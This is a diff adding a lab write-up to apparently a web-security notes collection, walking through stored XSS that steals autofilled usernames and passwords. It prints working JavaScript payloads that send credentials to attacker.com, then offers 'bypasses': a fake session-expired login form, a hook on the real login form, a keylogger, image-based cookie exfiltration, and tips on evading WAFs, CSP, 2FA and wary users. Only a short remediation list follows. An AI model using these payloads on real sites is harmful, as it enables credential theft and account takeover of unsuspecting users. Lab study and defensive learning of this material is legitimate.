@@ -10995,3 +10995,526 @@ If JavaScript executes → attacker controls everything the user can do
 ```
 
 ---
+
+# 🐞 Lab-27 — Stored XSS → Credential Theft (Autofill Abuse)
+
+---
+
+## 🧭 Overview
+
+This lab demonstrates a **Stored XSS attack** used to steal **credentials (username + password)** instead of cookies.
+
+---
+
+### 🧠 Core Idea
+
+```
+XSS → Create fake login fields → Browser autofills → Steal credentials
+```
+
+---
+
+### 🔥 Bigger Insight
+
+```
+Modern XSS = Stealing identity (not just session cookies)
+```
+
+---
+
+## 🔹 What Is This Topic?
+
+---
+
+### 🔴 Stored XSS
+
+✔ Malicious JavaScript is stored on server  
+✔ Executes automatically when victim visits page  
+
+---
+
+### 🔐 Credential Harvesting
+
+✔ Instead of stealing cookies  
+✔ Steal username + password directly  
+
+---
+
+## 🔄 Execution Flow
+
+```
+Attacker Injects Payload → Stored on Server → Victim Visits Page
+→ Browser Autofills → JS Triggers → Credentials Sent → Account Takeover
+```
+
+---
+
+## 🪜 Lab Walkthrough (Step-by-Step)
+
+---
+
+### ✅ Phase 1 — Inject Credential Stealer
+
+---
+
+#### 1️⃣ Prepare Payload
+
+```
+<input name=username id=username>
+
+<input type=password name=password 
+onchange="if(this.value.length)
+fetch('https://attacker.com',{
+method:'POST',
+mode:'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+---
+
+👉 Inject into blog comment
+
+---
+
+#### 2️⃣ Payload Stored
+
+```
+Server saves input → becomes part of page
+```
+
+---
+
+### ✅ Phase 2 — Victim Interaction & Data Theft
+
+---
+
+#### 3️⃣ Victim Opens Page
+
+```
+Admin visits blog → payload executes
+```
+
+---
+
+#### 4️⃣ Browser Autofills
+
+```
+Browser detects login fields → autofills username + password
+```
+
+---
+
+#### 5️⃣ `onchange` Triggers
+
+```
+Password field changes → JavaScript executes
+```
+
+---
+
+#### 6️⃣ Credentials Exfiltrated
+
+```
+POST https://attacker.com
+BODY: admin:password123
+```
+
+---
+
+#### 7️⃣ Login as Victim
+
+```
+Use stolen credentials → account takeover
+```
+
+---
+
+## 💣 Payload Breakdown (Easy + Deep)
+
+---
+
+### 🧩 Full Payload
+
+```
+<input name=username id=username>
+
+<input type=password name=password 
+onchange="if(this.value.length)
+fetch('https://attacker.com',{
+method:'POST',
+mode:'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+---
+
+### 🔹 Part 1 — Username Field
+
+```
+<input name=username id=username>
+```
+
+👉 Creates input field  
+👉 Browser autofills username  
+
+---
+
+### 🔹 Part 2 — Password Field
+
+```
+<input type=password name=password>
+```
+
+👉 Browser autofills password  
+
+---
+
+### 🔹 Part 3 — Event Trigger
+
+```
+onchange="..."
+```
+
+👉 Executes when:
+
+✔ Autofill occurs  
+✔ OR user types  
+
+---
+
+### 🔹 Part 4 — Condition
+
+```
+if(this.value.length)
+```
+
+👉 Ensures execution only if password exists  
+
+---
+
+### 🔹 Part 5 — Data Exfiltration
+
+```
+fetch('https://attacker.com', {...})
+```
+
+👉 Sends data to attacker  
+
+---
+
+### 🔹 Part 6 — Data Format
+
+```
+username.value + ':' + this.value
+```
+
+👉 Example:
+
+```
+admin:password123
+```
+
+---
+
+## 🧠 Full Attack Flow
+
+```
+1. Inject payload
+2. Victim loads page
+3. Browser autofills credentials
+4. Event triggers
+5. Script reads values
+6. Sends to attacker
+7. Attacker logs in as victim
+```
+
+---
+
+## 🌍 Real-World Scenarios & Bypasses
+
+---
+
+### 🔴 Scenario 1 — No Autofill / No Password Manager
+
+---
+
+❌ Problem:
+
+```
+No stored password → nothing to steal
+```
+
+---
+
+### ✅ Bypass — Fake Login (Phishing)
+
+```
+<div>Session expired. Login again</div>
+<input id="u">
+<input type="password" id="p">
+<button onclick="
+fetch('https://attacker.com',{
+method:'POST',
+mode:'no-cors',
+body:u.value+':'+p.value
+})">Login</button>
+```
+
+---
+
+🧠 Logic:
+
+✔ User manually enters credentials  
+✔ Attacker captures them  
+
+---
+
+### 🔴 Scenario 2 — User Ignores Fake Form
+
+---
+
+### ✅ Bypass — Hook Real Login Form
+
+```
+document.querySelector('form').addEventListener('submit', e => {
+  let u = document.querySelector('[name=username]').value;
+  let p = document.querySelector('[type=password]').value;
+
+  fetch('https://attacker.com',{
+    method:'POST',
+    mode:'no-cors',
+    body: u + ':' + p
+  });
+});
+```
+
+---
+
+🧠 Logic:
+
+✔ User logs in normally  
+✔ Attacker intercepts credentials  
+
+---
+
+### 🔴 Scenario 3 — Slow Typing / Partial Input
+
+---
+
+### ✅ Bypass — Keylogger
+
+```
+document.addEventListener('input', e => {
+  fetch('https://attacker.com?k=' + e.target.value);
+});
+```
+
+---
+
+🧠 Logic:
+
+✔ Capture keystrokes  
+✔ Reconstruct password  
+
+---
+
+### 🔴 Scenario 4 — CSP Blocks `fetch()`
+
+---
+
+❌ Problem:
+
+```
+External requests blocked
+```
+
+---
+
+### ✅ Bypass Techniques
+
+---
+
+✔ Image exfiltration:
+
+```
+new Image().src="https://attacker.com?d="+document.cookie;
+```
+
+---
+
+✔ Same-origin abuse:
+
+```
+fetch('/internal-api')
+```
+
+---
+
+### 🔴 Scenario 5 — WAF Filtering
+
+---
+
+❌ Problem:
+
+```
+Blocks: script, fetch, alert
+```
+
+---
+
+### ✅ Bypass Techniques
+
+```
+Encoding
+Event handlers
+AngularJS tricks
+throw/onerror
+```
+
+---
+
+### 🔴 Scenario 6 — HttpOnly Cookies
+
+---
+
+👉 Note:
+
+```
+Not relevant here
+```
+
+---
+
+✔ Because:
+
+```
+Password stealing bypasses HttpOnly completely
+```
+
+---
+
+### 🔴 Scenario 7 — 2FA Enabled
+
+---
+
+❌ Problem:
+
+```
+Password alone insufficient
+```
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Phish OTP
+Session riding
+Perform actions via XSS
+```
+
+---
+
+### 🔴 Scenario 8 — Modern UI Defenses
+
+---
+
+❌ Problem:
+
+```
+User suspicious of fake forms
+```
+
+---
+
+### ✅ Bypass Techniques
+
+```
+Match UI exactly
+Use CSS overlays
+Blur background
+Disable real interactions
+```
+
+---
+
+## 🔗 Attack Chains (Real Bug Bounty)
+
+---
+
+### 🔥 Chain 1
+
+```
+XSS → Fake login → Steal credentials → Account takeover
+```
+
+---
+
+### 🔥 Chain 2
+
+```
+XSS → Keylogger → Capture password → Login later
+```
+
+---
+
+### 🔥 Chain 3
+
+```
+XSS → Intercept login → Silent credential theft
+```
+
+---
+
+## 🛡️ Remediation
+
+---
+
+✔ Prevent XSS (primary fix)  
+✔ Disable autofill on sensitive inputs  
+✔ Implement CSP  
+✔ Use 2FA  
+✔ Monitor unusual login activity  
+
+---
+
+## 🧠 Mental Model
+
+---
+
+❌ XSS is NOT:
+
+```
+alert(1)
+```
+
+---
+
+✔ XSS IS:
+
+```
+Controlling UI
+Controlling user behavior
+Stealing secrets
+Acting as the user
+```
+
+---
+
+## 🔥 Final Truth
+
+```
+If attacker controls the page → they control what user sees and does
+```
+
+---
+
+## 🎯 One-Line Summary
+
+```
+If password isn’t stored → attacker makes the user type it
+```
+
+---
